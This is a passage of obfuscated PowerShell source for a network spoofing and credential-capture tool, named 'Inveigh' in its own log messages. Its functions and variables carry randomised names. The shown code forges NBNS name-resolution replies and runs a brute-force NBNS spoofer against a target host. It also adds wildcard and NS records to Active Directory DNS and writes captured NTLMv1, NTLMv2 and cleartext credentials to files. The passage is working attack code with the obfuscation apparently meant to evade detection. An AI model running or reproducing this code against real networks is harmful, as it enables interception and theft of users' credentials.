            $DPpOatzL99 = [System.BitConverter]::ToString($QLzUWiXo99[43..44])
            $DPpOatzL99 = Get-NBNSQueryType $DPpOatzL99
            $kYZXlJtB99 = $QLzUWiXo99[47]
            $OUuiALWw99 = "[+]"
            $usieQmFL99 = [System.BitConverter]::ToString($QLzUWiXo99[13..($QLzUWiXo99.Length - 4)])
            $usieQmFL99 = $usieQmFL99 -replace "-00",""
            $usieQmFL99 = $usieQmFL99.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $jNMDQmxr99 = New-Object System.String ($usieQmFL99,0,$usieQmFL99.Length)
            $XqkoLgDn99 = $jNMDQmxr99
            $jNMDQmxr99 = $jNMDQmxr99.Substring(0,$jNMDQmxr99.IndexOf("CA"))
            $kyzxACOa99 = $null
            $JdxmtGsw99 = $null
            $n = 0
                            
            do
            {
                $DaNDhVwp99 = (([Byte][Char]($jNMDQmxr99.Substring($n,1))) - 65)
                $kyzxACOa99 += ([System.Convert]::ToString($DaNDhVwp99,16))
                $n += 1
            }
            until($n -ge ($jNMDQmxr99.Length))
                    
            $n = 0
                    
            do
            {
                $JdxmtGsw99 += ([Char]([System.Convert]::ToInt16($kyzxACOa99.Substring($n,2),16)))
                $n += 2
            }
            until($n -ge ($kyzxACOa99.Length) -or $JdxmtGsw99.Length -eq 15)
            if($XqkoLgDn99.StartsWith("ABAC") -and $XqkoLgDn99.EndsWith("ACAB"))
            {
                $JdxmtGsw99 = $JdxmtGsw99.Substring(2)
                $JdxmtGsw99 = $JdxmtGsw99.Substring(0, $JdxmtGsw99.Length - 1)
                $JdxmtGsw99 = "<01><02>" + $JdxmtGsw99 + "<02>"
            }
            if($JdxmtGsw99 -notmatch '[^\x00-\x7F]+')
            {
                if(!$wzCNZfgp99.request_table.ContainsKey($JdxmtGsw99))
                {
                    $wzCNZfgp99.request_table.Add($JdxmtGsw99.ToLower(),[Array]$vngeYplM99.IPAddressToString)
                    $wzCNZfgp99.request_table_updated = $true
                }
                else
                {
                    $wzCNZfgp99.request_table.$JdxmtGsw99 += $vngeYplM99.IPAddressToString
                    $wzCNZfgp99.request_table_updated = $true
                }
            }
            
            $fLrgSLWG99 = appraisers -SfjCtTyl99 $JdxmtGsw99 -Type "NBNS" -HEKGWWAq99 $NBNS -LhUjVByd99 $kYZXlJtB99
            $OUuiALWw99 = $fLrgSLWG99[0]
            $fLrgSLWG99 = $fLrgSLWG99[1]
            if($fLrgSLWG99 -eq '[response sent]')
            {
                $qKsoeHPc99 = New-Object System.Net.IPEndpoint($PgCWVPrk99.Address,$PgCWVPrk99.Port)
                $pjtZHdCg99.Connect($qKsoeHPc99)
                $pjtZHdCg99.Send($xCQaEZvg99,$xCQaEZvg99.Length)
                $pjtZHdCg99.Close()
                $pjtZHdCg99 = New-Object System.Net.Sockets.UdpClient 137
                $pjtZHdCg99.Client.ReceiveTimeout = 5000
            }
            if($QLzUWiXo99)                   
            {
                $wzCNZfgp99.output_queue.Add("$OUuiALWw99 [$(Get-Date -format s)] NBNS request $JdxmtGsw99<$DPpOatzL99> received from $vngeYplM99 $fLrgSLWG99") > $null    
            }
            $QLzUWiXo99 = $null
        }
    }
    $pjtZHdCg99.Close()
 }
$yMfHHAZz99 = 
{
    param ($FADzjcAe99,$FLmqCpEm99,$nhjjrWtK99,$ZMtTESED99,$zwiuIZeM99)
   
    $FADzjcAe99 = $FADzjcAe99.ToUpper()
    $pcDaFXpx99 = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
                        0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00
    $GZdewpRX99 = [System.Text.Encoding]::UTF8.GetBytes($FADzjcAe99)
    $GZdewpRX99 = [System.BitConverter]::ToString($GZdewpRX99)
    $GZdewpRX99 = $GZdewpRX99.Replace("-","")
    $GZdewpRX99 = [System.Text.Encoding]::UTF8.GetBytes($GZdewpRX99)
    $ckLOaHna99 = [System.BitConverter]::GetBytes($ZMtTESED99)
    [Array]::Reverse($ckLOaHna99)
    for($i=0; $i -lt $GZdewpRX99.Count; $i++)
    {
        if($GZdewpRX99[$i] -gt 64)
        {
            $pcDaFXpx99[$i] = $GZdewpRX99[$i] + 10
        }
        else
        {
            $pcDaFXpx99[$i] = $GZdewpRX99[$i] + 17
        }
    
    }
    $xCQaEZvg99 = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                            $pcDaFXpx99 +
                            0x00,0x20,0x00,0x01 +
                            $ckLOaHna99 +
                            0x00,0x06,0x00,0x00 +
                            ([System.Net.IPAddress][String]([System.Net.IPAddress]$zwiuIZeM99)).GetAddressBytes() +
                            0x00,0x00,0x00,0x00
    $wzCNZfgp99.output_queue.Add("[*] [$(Get-Date -format s)] Starting NBNS brute force spoofer to resolve $FADzjcAe99 on $nhjjrWtK99") > $null
    $ERTzHpDG99 = $false          
    $nZMookqS99 = New-Object System.Net.Sockets.UdpClient(137)
    $bynIJRfn99 = [System.Net.IPAddress]::Parse($nhjjrWtK99)
    $XNXmuhez99 = New-Object Net.IPEndpoint($bynIJRfn99,137)
    $nZMookqS99.Connect($XNXmuhez99)
       
    while($wzCNZfgp99.running)
    {
        :NBNS_spoofer_loop while (!$wzCNZfgp99.hostname_spoof -and $wzCNZfgp99.running)
        {
            if($ERTzHpDG99)
            {
                $wzCNZfgp99.output_queue.Add("[*] [$(Get-Date -format s)] Resuming NBNS brute force spoofer") > $null
                $ERTzHpDG99 = $false
            }
            for ($i = 0; $i -lt 255; $i++)
            {
                for ($j = 0; $j -lt 255; $j++)
                {
                    $xCQaEZvg99[0] = $i
                    $xCQaEZvg99[1] = $j                 
                    $nZMookqS99.send($xCQaEZvg99,$xCQaEZvg99.Length)
                    if($wzCNZfgp99.hostname_spoof -and $FLmqCpEm99)
                    {
                        $wzCNZfgp99.output_queue.Add("[*] [$(Get-Date -format s)] Pausing NBNS brute force spoofer") > $null
                        $ERTzHpDG99 = $true
                        break NBNS_spoofer_loop
                    }
                
                }
            
            }
        
        }
        Start-Sleep -m 5
    }
    $nZMookqS99.Close()
}
$cIINfMld99 =
{
    param ($TdCLPmgP99,$ozNfTVeL99,[System.Management.Automation.PSCredential]$wtlMKEkf99,$eYIjtbUX99,
        $aADJnjNS99,$irVhQGBY99,$eNGAuPPB99,$UXTcPCVe99,$qMKhaLNb99,$pZPlOUmA99,
        $EIAKYMzI99,$SQvPCXcG99,$bBSwGtbL99,$hTlToBCy99,$JQAOpCUk99,$FLmqCpEm99,
        $GIZTcqVL99,$gyFkhRAU99,$zwiuIZeM99)
    function hardener
    {
        while($wzCNZfgp99.output_queue.Count -gt 0)
        {
            $wzCNZfgp99.console_queue.Add($wzCNZfgp99.output_queue[0]) > $null
            if($wzCNZfgp99.file_output)
            {
                
                if ($wzCNZfgp99.output_queue[0].StartsWith("[+] ") -or $wzCNZfgp99.output_queue[0].StartsWith("[*] ") -or $wzCNZfgp99.output_queue[0].StartsWith("[!] ") -or $wzCNZfgp99.output_queue[0].StartsWith("[-] "))
                {
                    $wzCNZfgp99.log_file_queue.Add($wzCNZfgp99.output_queue[0]) > $null
                }
                else
                {
                    $wzCNZfgp99.log_file_queue.Add("[redacted]") > $null    
                }
            }
            if($wzCNZfgp99.log_output)
            {
                $wzCNZfgp99.log.Add($wzCNZfgp99.output_queue[0]) > $null
            }
            $wzCNZfgp99.output_queue.RemoveAt(0)
        }
    }
    function prated
    {
        param ([String]$CmKfsyuA99)
        
        if($wzCNZfgp99.HTTPS -and !$wzCNZfgp99.HTTPS_existing_certificate -or ($wzCNZfgp99.HTTPS_existing_certificate -and $wzCNZfgp99.HTTPS_force_certificate_delete))
        {
            try
            {
                $GJrUJqiF99 = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
                $GJrUJqiF99.Open('ReadWrite')
                $zhFYpNvi99 = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $wzCNZfgp99.certificate_issuer})
                foreach($dRyvirrT99 in $zhFYpNvi99)
                {
                    $GJrUJqiF99.Remove($dRyvirrT99)
                }
                $GJrUJqiF99.Close()
            }
            catch
            {
                $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] SSL Certificate Deletion Error [Remove Manually]") > $null
            }
        }
        if($ozNfTVeL99 -eq 'Y' -and $wzCNZfgp99.ADIDNS_table.Count -gt 0)
        {
            [Array]$RzwlAByt99 = $wzCNZfgp99.ADIDNS_table.Keys
            foreach($EVzMAFnn99 in $RzwlAByt99)
            {
                
                if($wzCNZfgp99.ADIDNS_table.$EVzMAFnn99 -ge 1)
                {
                    try
                    {
                        umpire -agAaKWoK99 $wtlMKEkf99 -gJEKQvQm99 $eYIjtbUX99 -WSnjjaRO99 $aADJnjNS99 -Node $EVzMAFnn99 -iZRypARs99 $pZPlOUmA99 -Zone $bBSwGtbL99
                        $wzCNZfgp99.ADIDNS_table.$EVzMAFnn99 = $null
                    }
                    catch
                    {
                        $kRjlpgSh99 = $_.Exception.Message
                        $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
                        $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
                        $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] ADIDNS host record for $EVzMAFnn99 remove failed") > $null
                    }
                }
            }
        }
        
        if($wzCNZfgp99.relay_running)
        {
            Start-Sleep -m 100
            if($CmKfsyuA99)
            {
                $wzCNZfgp99.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting due to $CmKfsyuA99") > $null
            }
            else
            {
                $wzCNZfgp99.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting") > $null  
            }
            if(!$wzCNZfgp99.running)
            {
                hardener
                Start-Sleep -m 100
            }
            $wzCNZfgp99.relay_running = $false
        }
        if($wzCNZfgp99.running)
        {
            if($CmKfsyuA99)
            {
                $wzCNZfgp99.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting due to $CmKfsyuA99") > $null
            }
            else
            {
                $wzCNZfgp99.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting") > $null  
            }
            hardener
            if(!$JQAOpCUk99)
            {
                Start-Sleep -s 3
            }
            $wzCNZfgp99.running = $false
        }
        $wzCNZfgp99.ADIDNS = $null
        $wzCNZfgp99.HTTPS = $false
    }
    if($wzCNZfgp99.ADIDNS -contains 'Wildcard')
    {
        visioned -agAaKWoK99 $wtlMKEkf99 -Data $zwiuIZeM99 -gJEKQvQm99 $eYIjtbUX99 -WSnjjaRO99 $aADJnjNS99 -MCxnfbXk99 $irVhQGBY99 -Node '*' -iZRypARs99 $pZPlOUmA99 -Type 'A'-TTL $SQvPCXcG99 -Zone $bBSwGtbL99
    }
    if($wzCNZfgp99.ADIDNS -contains 'NS')
    {
        if($qMKhaLNb99.EndsWith($bBSwGtbL99))
        {
            $zRgrFRsN99 = $qMKhaLNb99
            $qMKhaLNb99 = $qMKhaLNb99 -replace ".$bBSwGtbL99",''
        }
        else
        {
            $zRgrFRsN99 = $qMKhaLNb99 + "." + $bBSwGtbL99
        }
        visioned -agAaKWoK99 $wtlMKEkf99 -Data $zwiuIZeM99 -gJEKQvQm99 $eYIjtbUX99 -WSnjjaRO99 $aADJnjNS99 -MCxnfbXk99 $irVhQGBY99 -Node $qMKhaLNb99 -iZRypARs99 $pZPlOUmA99 -Type 'A' -TTL $SQvPCXcG99 -Zone $bBSwGtbL99
        visioned -agAaKWoK99 $wtlMKEkf99 -Data $zRgrFRsN99 -gJEKQvQm99 $eYIjtbUX99 -WSnjjaRO99 $aADJnjNS99 -MCxnfbXk99 $irVhQGBY99 -Node $UXTcPCVe99 -iZRypARs99 $pZPlOUmA99 -Type 'NS' -TTL $SQvPCXcG99 -Zone $bBSwGtbL99
    }
    if($FLmqCpEm99)
    {   
        $tbkOmwHQ99 = New-TimeSpan -Seconds $FLmqCpEm99
    }
    $gLLwXeHY99 = $GIZTcqVL99 + $wzCNZfgp99.NTLMv1_list.Count
    $Cggmiwhb99 = $GIZTcqVL99 + $wzCNZfgp99.NTLMv2_list.Count
    $fZoZXrOo99 = $GIZTcqVL99 + $wzCNZfgp99.cleartext_list.Count
    if($gyFkhRAU99)
    {    
        $BNhoTYTD99 = New-TimeSpan -Minutes $gyFkhRAU99
        $iXDavGxj99 = [System.Diagnostics.Stopwatch]::StartNew()
    }
    while($wzCNZfgp99.running)
    {
        if($FLmqCpEm99 -and $wzCNZfgp99.hostname_spoof)
        {
         
            if($wzCNZfgp99.NBNS_stopwatch.Elapsed -ge $tbkOmwHQ99)
            {
                $wzCNZfgp99.hostname_spoof = $false
            }
        
        }
        if($GIZTcqVL99)
        {
            
            if($wzCNZfgp99.NTLMv1_list.Count -ge $gLLwXeHY99 -or $wzCNZfgp99.NTLMv2_list.Count -ge $Cggmiwhb99 -or $wzCNZfgp99.cleartext_list.Count -ge $fZoZXrOo99)
            {
                prated "reaching run count"           
            }
        }
        if($gyFkhRAU99)
        {
            if($iXDavGxj99.Elapsed -ge $BNhoTYTD99)
            {
                prated "reaching run time"
            }
        }
        if($wzCNZfgp99.ADIDNS -contains 'Combo' -and $wzCNZfgp99.request_table_updated)
        {
            
            try
            {
                greeted -agAaKWoK99 $wtlMKEkf99 -Data $zwiuIZeM99 -gJEKQvQm99 $eYIjtbUX99 -WSnjjaRO99 $aADJnjNS99 -MCxnfbXk99 $irVhQGBY99 -oxLMfbyI99 $eNGAuPPB99 -iZRypARs99 $pZPlOUmA99 -MTBtHdVN99 $wzCNZfgp99.request_table -jkBrOZtA99 $EIAKYMzI99 -TTL $SQvPCXcG99 -Zone $bBSwGtbL99
            }
            catch
            {
                $kRjlpgSh99 = $_.Exception.Message
                $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
                $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
            }
            $wzCNZfgp99.request_table_updated = $false
        }
        if($wzCNZfgp99.ADIDNS -and $wzCNZfgp99.ADIDNS_table.Count -gt 0)
        {
            [Array]$RzwlAByt99 = $wzCNZfgp99.ADIDNS_table.Keys
            foreach($EVzMAFnn99 in $RzwlAByt99)
            {
                
                if($wzCNZfgp99.ADIDNS_table.$EVzMAFnn99 -eq 1)
                {
                    try
                    {
                        ellipsis -agAaKWoK99 $wtlMKEkf99 -gJEKQvQm99 $eYIjtbUX99 -WSnjjaRO99 $aADJnjNS99 -Node $EVzMAFnn99 -TwlCoISC99 'Authenticated Users'-Zone $bBSwGtbL99
                        $wzCNZfgp99.ADIDNS_table.$EVzMAFnn99 = 2
                    }
                    catch
                    {
                        $kRjlpgSh99 = $_.Exception.Message
                        $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
                        $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
                        $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS ACE add for host record for $EVzMAFnn99 failed") > $null
                    }
                }
            }
        }
        if($wzCNZfgp99.file_output)
        {
            while($wzCNZfgp99.log_file_queue.Count -gt 0)
            {
                $wzCNZfgp99.log_file_queue[0]|Out-File $wzCNZfgp99.log_out_file -Append
                $wzCNZfgp99.log_file_queue.RemoveAt(0)
            }
            while($wzCNZfgp99.NTLMv1_file_queue.Count -gt 0)
            {
                $wzCNZfgp99.NTLMv1_file_queue[0]|Out-File $wzCNZfgp99.NTLMv1_out_file -Append
                $wzCNZfgp99.NTLMv1_file_queue.RemoveAt(0)
            }
            while($wzCNZfgp99.NTLMv2_file_queue.Count -gt 0)
            {
                $wzCNZfgp99.NTLMv2_file_queue[0]|Out-File $wzCNZfgp99.NTLMv2_out_file -Append
                $wzCNZfgp99.NTLMv2_file_queue.RemoveAt(0)
            }
            while($wzCNZfgp99.cleartext_file_queue.Count -gt 0)
            {
                $wzCNZfgp99.cleartext_file_queue[0]|Out-File $wzCNZfgp99.cleartext_out_file -Append
                $wzCNZfgp99.cleartext_file_queue.RemoveAt(0)
            }
            while($wzCNZfgp99.POST_request_file_queue.Count -gt 0)
            {
                $wzCNZfgp99.POST_request_file_queue[0]|Out-File $wzCNZfgp99.POST_request_out_file -Append
                $wzCNZfgp99.POST_request_file_queue.RemoveAt(0)
            }
        }
        if(!$wzCNZfgp99.console_output -and $hTlToBCy99 -ge 0)
        {
            while($wzCNZfgp99.console_queue.Count -gt $hTlToBCy99 -and !$wzCNZfgp99.console_output)
            {
                $wzCNZfgp99.console_queue.RemoveAt(0)
            }
        }
        if(!$wzCNZfgp99.status_output)
        {
            hardener
        }
        Start-Sleep -m 5
        
        if($wzCNZfgp99.stop)
        {
            $wzCNZfgp99.console_queue.Clear()
            prated
        }
    }
}
function accreditation
{
    $LIbSoyXf99 = $false
    $qilonUmG99 = $false
    $bRmbqVzq99 = [RunspaceFactory]::CreateRunspace()
    $bRmbqVzq99.Open()
    $bRmbqVzq99.SessionStateProxy.SetVariable('inveigh',$wzCNZfgp99)
    $givnovVa99 = [PowerShell]::Create()
    $givnovVa99.Runspace = $bRmbqVzq99
    $givnovVa99.AddScript($qDhCcAQO99) > $null
    $givnovVa99.AddScript($DhwNtqxV99) > $null
    $givnovVa99.AddScript($RZtmuZMB99) > $null
    $givnovVa99.AddScript($piiENYJq99).AddArgument($OpSametq99).AddArgument($YQiNABub99).AddArgument(
        $NkBYNNgQ99).AddArgument($mPKrHuBF99).AddArgument($rHCPryid99).AddArgument(
        $kvoRCffi99).AddArgument($mQkdAcSO99).AddArgument($ronDUKWy99).AddArgument(
        $nKkxBvGh99).AddArgument($UbhtORQL99).AddArgument($uuWWIRDe99).AddArgument(
        $DYCiYqcl99).AddArgument($OHQVRNnZ99).AddArgument($uzYCVpkd99).AddArgument(
        $SvQlrCWB99).AddArgument($qilonUmG99).AddArgument($IP).AddArgument($FLmqCpEm99).AddArgument(
        $HHgEZHCn99).AddArgument($Proxy).AddArgument($xZwnRmnl99).AddArgument($LIbSoyXf99).AddArgument(
        $cWbsxIoQ99).AddArgument($GvqEXUZu99).AddArgument($mooPFzLL99) > $null
    $givnovVa99.BeginInvoke() > $null
}
Start-Sleep -m 50
function indolence
{
    $LIbSoyXf99 = $false
    $qilonUmG99 = $true
    $lmmwinIS99 = [RunspaceFactory]::CreateRunspace()
    $lmmwinIS99.Open()
    $lmmwinIS99.SessionStateProxy.SetVariable('inveigh',$wzCNZfgp99)
    $CnDJgkke99 = [PowerShell]::Create()
    $CnDJgkke99.Runspace = $lmmwinIS99
    $CnDJgkke99.AddScript($qDhCcAQO99) > $null
    $CnDJgkke99.AddScript($DhwNtqxV99) > $null
    $CnDJgkke99.AddScript($RZtmuZMB99) > $null
    $CnDJgkke99.AddScript($piiENYJq99).AddArgument($OpSametq99).AddArgument($YQiNABub99).AddArgument(
        $NkBYNNgQ99).AddArgument($mPKrHuBF99).AddArgument($rHCPryid99).AddArgument(
        $kvoRCffi99).AddArgument($mQkdAcSO99).AddArgument($ronDUKWy99).AddArgument(
        $nKkxBvGh99).AddArgument($UbhtORQL99).AddArgument($ErJSnLHL99).AddArgument(
        $DYCiYqcl99).AddArgument($OHQVRNnZ99).AddArgument($uzYCVpkd99).AddArgument(
        $SvQlrCWB99).AddArgument($qilonUmG99).AddArgument($IP).AddArgument($FLmqCpEm99).AddArgument(
        $HHgEZHCn99).AddArgument($Proxy).AddArgument($xZwnRmnl99).AddArgument($LIbSoyXf99).AddArgument(
        $cWbsxIoQ99).AddArgument($GvqEXUZu99).AddArgument($mooPFzLL99) > $null
    $CnDJgkke99.BeginInvoke() > $null
}
Start-Sleep -m 50
function Amazons
{
    $LIbSoyXf99 = $true
    $qilonUmG99 = $false
    $CRuCMWsg99 = [RunspaceFactory]::CreateRunspace()
    $CRuCMWsg99.Open()
    $CRuCMWsg99.SessionStateProxy.SetVariable('inveigh',$wzCNZfgp99)
    $YqIkjuoB99 = [PowerShell]::Create()
    $YqIkjuoB99.Runspace = $CRuCMWsg99
    $YqIkjuoB99.AddScript($qDhCcAQO99) > $null
    $YqIkjuoB99.AddScript($DhwNtqxV99) > $null
    $YqIkjuoB99.AddScript($RZtmuZMB99) > $null
    $YqIkjuoB99.AddScript($piiENYJq99).AddArgument($OpSametq99).AddArgument($YQiNABub99).AddArgument(
        $NkBYNNgQ99).AddArgument($mPKrHuBF99).AddArgument($rHCPryid99).AddArgument(
        $kvoRCffi99).AddArgument($mQkdAcSO99).AddArgument($ronDUKWy99).AddArgument(
        $nKkxBvGh99).AddArgument($uXKhDCWf99).AddArgument($SvSyggKE99).AddArgument(
        $DYCiYqcl99).AddArgument($OHQVRNnZ99).AddArgument($uzYCVpkd99).AddArgument(
        $SvQlrCWB99).AddArgument($qilonUmG99).AddArgument($IP).AddArgument($FLmqCpEm99).AddArgument(
        $HHgEZHCn99).AddArgument($Proxy).AddArgument($xZwnRmnl99).AddArgument($LIbSoyXf99).AddArgument(
        $cWbsxIoQ99).AddArgument($GvqEXUZu99).AddArgument($mooPFzLL99) > $null
    $YqIkjuoB99.BeginInvoke() > $null
}
function clinks
{
    $pJNlaxjv99 = [RunspaceFactory]::CreateRunspace()
    $pJNlaxjv99.Open()
    $pJNlaxjv99.SessionStateProxy.SetVariable('inveigh',$wzCNZfgp99)
    $IhgyCGoW99 = [PowerShell]::Create()
    $IhgyCGoW99.Runspace = $pJNlaxjv99
    $IhgyCGoW99.AddScript($qDhCcAQO99) > $null
    $IhgyCGoW99.AddScript($DhwNtqxV99) > $null
    $IhgyCGoW99.AddScript($RZtmuZMB99) > $null
    $IhgyCGoW99.AddScript($WQUQIDSa99) > $null
    $IhgyCGoW99.AddScript($wxLxOSAe99).AddArgument($DNS).AddArgument($JApKCTck99).AddArgument(
        $rosmaqHG99).AddArgument($FpxqDLtp99).AddArgument($IP).AddArgument($YQiNABub99).AddArgument($NkBYNNgQ99).AddArgument(
        $mPKrHuBF99).AddArgument($rHCPryid99).AddArgument($LLMNR).AddArgument(
        $IEFYrrrG99).AddArgument($mDNS).AddArgument($GSmWUQVj99).AddArgument($VzyZNqnS99).AddArgument($NBNS).AddArgument(
        $ZMtTESED99).AddArgument($tPiDssiv99).AddArgument($HHgEZHCn99).AddArgument($Pcap).AddArgument(
        $CBlLlQgp99).AddArgument($oCOyAgdf99).AddArgument($SMB).AddArgument($DzGorPak99).AddArgument(
        $aaGIoVaU99).AddArgument($zwiuIZeM99).AddArgument($SDnpWGxP99).AddArgument(
        $VBgThnPx99).AddArgument($TureDGKs99).AddArgument($eqnDzsgQ99).AddArgument(
        $xeByEGnv99).AddArgument($kbfXrXcm99).AddArgument(
        $aqPCuNat99).AddArgument($UlUbQxYF99) > $null
    $IhgyCGoW99.BeginInvoke() > $null
}
function congratulate
{
    $uThwpbHC99 = [RunspaceFactory]::CreateRunspace()
    $uThwpbHC99.Open()
    $uThwpbHC99.SessionStateProxy.SetVariable('inveigh',$wzCNZfgp99)
    $JAeSqXrw99 = [PowerShell]::Create()
    $JAeSqXrw99.Runspace = $uThwpbHC99
    $JAeSqXrw99.AddScript($qDhCcAQO99) > $null
    $JAeSqXrw99.AddScript($gLJjiPwe99).AddArgument($FpxqDLtp99).AddArgument(
        $JApKCTck99).AddArgument($zwiuIZeM99) > $null
    $JAeSqXrw99.BeginInvoke() > $null
}
function pussyfoot
{
    $njvEdpoe99 = [RunspaceFactory]::CreateRunspace()
    $njvEdpoe99.Open()
    $njvEdpoe99.SessionStateProxy.SetVariable('inveigh',$wzCNZfgp99)
    $rZHINRkn99 = [PowerShell]::Create()
    $rZHINRkn99.Runspace = $njvEdpoe99
    $rZHINRkn99.AddScript($qDhCcAQO99) > $null
    $rZHINRkn99.AddScript($ALQTLwwh99).AddArgument($FpxqDLtp99).AddArgument(
        $IEFYrrrG99).AddArgument($zwiuIZeM99).AddArgument($aaGIoVaU99).AddArgument(
        $DzGorPak99).AddArgument($VBgThnPx99).AddArgument(
        $SDnpWGxP99).AddArgument($kbfXrXcm99) > $null
    $rZHINRkn99.BeginInvoke() > $null
}
function mcongratulate
{
    $CsfBjCXT99 = [RunspaceFactory]::CreateRunspace()
    $CsfBjCXT99.Open()
    $CsfBjCXT99.SessionStateProxy.SetVariable('inveigh',$wzCNZfgp99)
    $dPiiQLWK99 = [PowerShell]::Create()
    $dPiiQLWK99.Runspace = $CsfBjCXT99
    $dPiiQLWK99.AddScript($qDhCcAQO99) > $null
    $dPiiQLWK99.AddScript($xRCvKplx99).AddArgument($FpxqDLtp99).AddArgument(
        $VzyZNqnS99).AddArgument($GSmWUQVj99).AddArgument($zwiuIZeM99).AddArgument($aaGIoVaU99).AddArgument(
        $DzGorPak99).AddArgument($VBgThnPx99).AddArgument($SDnpWGxP99) > $null
    $dPiiQLWK99.BeginInvoke() > $null
}
function slimmest
{
    $iTmsZTin99 = [RunspaceFactory]::CreateRunspace()
    $iTmsZTin99.Open()
    $iTmsZTin99.SessionStateProxy.SetVariable('inveigh',$wzCNZfgp99)
    $cQGrMPut99 = [PowerShell]::Create()
    $cQGrMPut99.Runspace = $iTmsZTin99
    $cQGrMPut99.AddScript($qDhCcAQO99) > $null
    $cQGrMPut99.AddScript($RXizXwDv99).AddArgument($FpxqDLtp99).AddArgument(
        $IP).AddArgument($ZMtTESED99).AddArgument($tPiDssiv99).AddArgument($zwiuIZeM99).AddArgument(
        $DzGorPak99).AddArgument($aaGIoVaU99).AddArgument($SDnpWGxP99).AddArgument(
        $VBgThnPx99).AddArgument($kbfXrXcm99) > $null
    $cQGrMPut99.BeginInvoke() > $null
}
function wagged
{
    $FDHEwQRw99 = [RunspaceFactory]::CreateRunspace()
    $FDHEwQRw99.Open()
    $FDHEwQRw99.SessionStateProxy.SetVariable('inveigh',$wzCNZfgp99)
    $yMnrNeAW99 = [PowerShell]::Create()
    $yMnrNeAW99.Runspace = $FDHEwQRw99
    $yMnrNeAW99.AddScript($qDhCcAQO99) > $null
    $yMnrNeAW99.AddScript($yMfHHAZz99).AddArgument(
    $FADzjcAe99).AddArgument($FLmqCpEm99).AddArgument($nhjjrWtK99).AddArgument(
    $ZMtTESED99).AddArgument($zwiuIZeM99) > $null
    $yMnrNeAW99.BeginInvoke() > $null
}
function swift
{
    $pbkOWwwt99 = [RunspaceFactory]::CreateRunspace()
    $pbkOWwwt99.Open()
    $pbkOWwwt99.SessionStateProxy.SetVariable('inveigh',$wzCNZfgp99)
    $QLqXebDq99 = [PowerShell]::Create()
    $QLqXebDq99.Runspace = $pbkOWwwt99
    $QLqXebDq99.AddScript($qDhCcAQO99) > $null
    $QLqXebDq99.AddScript($MBSCqXvi99) > $null
    $QLqXebDq99.AddScript($cIINfMld99).AddArgument($TdCLPmgP99).AddArgument(
        $ozNfTVeL99).AddArgument($wtlMKEkf99).AddArgument($eYIjtbUX99).AddArgument(
        $aADJnjNS99).AddArgument($irVhQGBY99).AddArgument($eNGAuPPB99).AddArgument(
        $UXTcPCVe99).AddArgument($qMKhaLNb99).AddArgument($pZPlOUmA99).AddArgument(
        $EIAKYMzI99).AddArgument($SQvPCXcG99).AddArgument($bBSwGtbL99).AddArgument(
        $hTlToBCy99).AddArgument($JQAOpCUk99).AddArgument($FLmqCpEm99).AddArgument(
        $GIZTcqVL99).AddArgument($gyFkhRAU99).AddArgument($zwiuIZeM99) > $null
    $QLqXebDq99.BeginInvoke() > $null
}
if($HTTP -eq 'Y')
{
    accreditation
}
if($HTTPS -eq 'Y')
{
    indolence
}
if($Proxy -eq 'Y')
{
    Amazons
}
if(($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y' -or $FpxqDLtp99) -and $JQAOpCUk99)
{ 
    clinks
}
elseif(($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y') -and !$JQAOpCUk99)
{
    if($DNS -eq 'Y')
    {
        congratulate
    }
    if($LLMNR -eq 'Y')
    {
        pussyfoot
    }
    if($mDNS -eq 'Y')
    {
        mcongratulate
    }
    if($NBNS -eq 'Y')
    {
        slimmest
    }
    if($nXjSZCTI99 -eq 'Y')
    {
        wagged
    }
}
if($nXjSZCTI99 -eq 'Y')
{
    wagged
}
swift
try
{
    if($liSaTCmu99 -ne 'N')
    {
        if($TwzNLFBf99)
        {    
            $uBzUnpSW99 = New-TimeSpan -Minutes $TwzNLFBf99
            $NuflVMGr99 = [System.Diagnostics.Stopwatch]::StartNew()
        }
        :console_loop while(($wzCNZfgp99.running -and $wzCNZfgp99.console_output) -or ($wzCNZfgp99.console_queue.Count -gt 0 -and $wzCNZfgp99.console_output))
        {
    
            while($wzCNZfgp99.console_queue.Count -gt 0)
            {
                switch -wildcard ($wzCNZfgp99.console_queue[0])
                {
                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {
                        if($wzCNZfgp99.output_stream_only)
                        {
                            Write-Output($wzCNZfgp99.console_queue[0] + $wzCNZfgp99.newline)
                        }
                        else
                        {
                            Write-Warning($wzCNZfgp99.console_queue[0])
                        }
                        $wzCNZfgp99.console_queue.RemoveAt(0)
                    }
                    {$_ -like "* spoofer disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                    {
                        if($liSaTCmu99 -eq 'Y')
                        {
                            if($wzCNZfgp99.output_stream_only)
                            {
